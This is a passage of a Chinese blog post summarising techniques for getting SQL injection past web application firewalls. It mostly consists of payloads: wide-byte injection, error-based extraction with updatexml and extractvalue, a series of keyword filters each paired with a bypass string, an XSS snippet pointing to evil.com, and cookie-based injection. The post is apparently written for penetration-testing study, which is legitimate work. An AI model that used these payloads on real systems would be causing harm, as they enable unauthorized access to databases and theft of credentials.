+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
+<h4 id="13-多参数请求拆分"><a href="#13-多参数请求拆分" class="headerlink" title="13.多参数请求拆分"></a>13.多参数请求拆分</h4><p>对于多个参数拼接到同一条sql语句中的情况，可以将sql语句分割插入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;[input1]&amp;b&#x3D;[input2]</span><br></pre></td></tr></table></figure>
+<p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a&#x3D;[input1] and b&#x3D;[input2]</span><br></pre></td></tr></table></figure>
+<p>这个时候就可以进行拼接，如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*&amp;b&#x3D;*&#x2F;select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>最终得到的sql语句如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a&#x3D;union &#x2F;*and b&#x3D;*&#x2F;select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h4 id="14-生僻函数"><a href="#14-生僻函数" class="headerlink" title="14.生僻函数"></a>14.生僻函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MySQL&#x2F;PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x&#x3D;_&gt;&lt;&#x2F;script&gt; ’,’&#x2F;script&#x2F;@x&#x2F;’,’src&#x3D;&#x2F;&#x2F;evil.com’);　　　　　　　　　　</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">SELECT xmlelement(name img,xmlattributes(1as src,&#39;a\l\x65rt(1)&#39;as \117n\x65rror));　&#x2F;&#x2F;postgresql</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x5c,(select user()),0x5c),1))</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x5c, (select user()),0x5c))</span><br></pre></td></tr></table></figure>
+<h4 id="15-反引号绕过"><a href="#15-反引号绕过" class="headerlink" title="15.反引号绕过"></a>15.反引号绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;version()&#96;，可以用来过空格和正则，特殊情况下还可以将其做注释符用</span><br></pre></td></tr></table></figure>
+<h4 id="16-N绕过"><a href="#16-N绕过" class="headerlink" title="16. \N绕过"></a>16. \N绕过</h4><p>\N相当于NULL字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;8E0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id&#x3D;8.0union select 1,2,3,4,5,6,7,8,9,0</span><br><span class="line">select * from users where id&#x3D;\Nunion select 1,2,3,4,5,6,7,8,9,0</span><br></pre></td></tr></table></figure>
+<h4 id="17-php中常见的waf及绕过"><a href="#17-php中常见的waf及绕过" class="headerlink" title="17.php中常见的waf及绕过"></a>17.php中常见的waf及绕过</h4><p>php过滤直接用<code>preg_match(&#39;/(&#39;.waf.&#39;)/i&#39;,$id)</code></p>
+<h5 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or&#39;</span><br><span class="line">过滤代码 1 or 1&#x3D;1   1 and 1&#x3D;1</span><br><span class="line">绕过方式 1 || 1&#x3D;1   1 &amp;&amp; 1&#x3D;1</span><br></pre></td></tr></table></figure>
+<h5 id="过滤union"><a href="#过滤union" class="headerlink" title="过滤union"></a>过滤union</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union&#39;</span><br><span class="line">过滤代码 union select user,password from users</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>
+<h5 id="过滤where"><a href="#过滤where" class="headerlink" title="过滤where"></a>过滤where</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>
+<h5 id="过滤limit"><a href="#过滤limit" class="headerlink" title="过滤limit"></a>过滤limit</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;#user_id聚合中user_id为1的user为admin</span><br></pre></td></tr></table></figure>
+<h5 id="过滤group-by"><a href="#过滤group-by" class="headerlink" title="过滤group by"></a>过滤group by</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit|group by&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br></pre></td></tr></table></figure>
+<h5 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit|group by|select&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) &#x3D; 1</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br></pre></td></tr></table></figure>
+<h5 id="过滤’-单引号"><a href="#过滤’-单引号" class="headerlink" title="过滤’(单引号)"></a>过滤’(单引号)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit|group by|select|\&#39;&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; &#39;a&#39;</span><br><span class="line">绕过方式 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) &#x3D; 0x61    1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br></pre></td></tr></table></figure>
+<h5 id="过滤hex"><a href="#过滤hex" class="headerlink" title="过滤hex"></a>过滤hex</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit|group by|select|\&#39;|hex&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; unhex(61)</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>
+<h5 id="过滤substr"><a href="#过滤substr" class="headerlink" title="过滤substr"></a>过滤substr</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf &#x3D; &#39;and|or|union|where|limit|group by|select|\&#39;|hex|substr&#39;</span><br><span class="line">过滤代码 1 &amp;&amp; substr(user,1,1) &#x3D; lower(conv(11,10,16)) </span><br><span class="line">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#39;r&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="18-更改注入参数传参方式"><a href="#18-更改注入参数传参方式" class="headerlink" title="18.更改注入参数传参方式"></a>18.更改注入参数传参方式</h4><p>如果在代码中使用<code>$_REQUEST</code>获取参数，而<code>$_REQUEST</code>会依次从GET/POST/cookie中获取参数，如果WAF只检测了GET/POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。</p>
+
+  
+  
+  
+  <div class='footer'>
+    
+    
+    
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fal fa-bookmark fa-fw" aria-hidden="true"></i><span>相关文章</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="\2021\11\15\AWD赛前学习笔记\" title="AWD赛前学习笔记" rel="bookmark "><img src="/images/AWD/1.png" class="lazyload" data-srcset="/images/AWD/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" /><span class="title">AWD赛前学习笔记</span></a><a class="item" href="\2021\11\29\二次注入sql-labs 第五关\" title="sqli-labs第五关二次注入" rel="bookmark "><img src="/images/sql-lab/1.JPG" class="lazyload" data-srcset="/images/sql-lab/1.JPG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" /><span class="title">sqli-labs第五关二次注入</span></a><a class="item" href="\2021\02\26\渗透测试过程总结\" title="渗透测试过程总结" rel="bookmark "><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" /><span class="title">渗透测试过程总结</span></a><a class="item" href="\2021\01\18\OWASP Top10\" title="OWASP TOP10介绍" rel="bookmark "><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" /><span class="title">OWASP TOP10介绍</span></a></div></section></div>
+    
+    
+    <div class='copyright'>
+      <blockquote>
+        
+        
+        <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+        
+        
+        
+        <p>本文永久链接是：<a href=http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/>http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a></p>
+        
+        
+      </blockquote>
+    </div>
+    
+    
+  </div>
+  
+  
+  
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-12-12T23:21:56+08:00">
+  <a class='notlink'>
+    <i class="fal fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Dec 12, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="nofollow"><i class="fal fa-hashtag fa-fw" aria-hidden="true"></i><p>渗透测试</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fal fa-hashtag fa-fw" aria-hidden="true"></i><p>sql注入</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%BB%95%E8%BF%87/" rel="nofollow"><i class="fal fa-hashtag fa-fw" aria-hidden="true"></i><p>绕过</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/&title=SQL注入绕过知识汇总 - 小胡不甘平凡&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/&title=SQL注入绕过知识汇总 - 小胡不甘平凡&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://xiaohublog.cn/2021/12/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/&title=SQL注入绕过知识汇总 - 小胡不甘平凡&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
 </div>
 
 
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+  <div class="prev-next">
+    
+    
+    <a class='next' href='/2021/11/29/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5sql-labs%20%E7%AC%AC%E4%BA%94%E5%85%B3/'>
+      <p class='title'>sqli-labs第五关二次注入<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+      <p class='content'>sqli-labs第五关解题思路及拓展,这一关的解题思路有很多种，也算是比较有意思的一关。话不多说，直接开始进行解题。
+首先测试是什么类型的注入
+
+通过页面回显可以知道是字符型的注入，并且是使用...</p>
+    </a>
+    
+  </div>
+  
+</article>
+
+
+
+
+  <article class="post white-box reveal shadow floatable" id="comments">
+    <p ct><i class='fal fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+</div>
       </div>
       
   
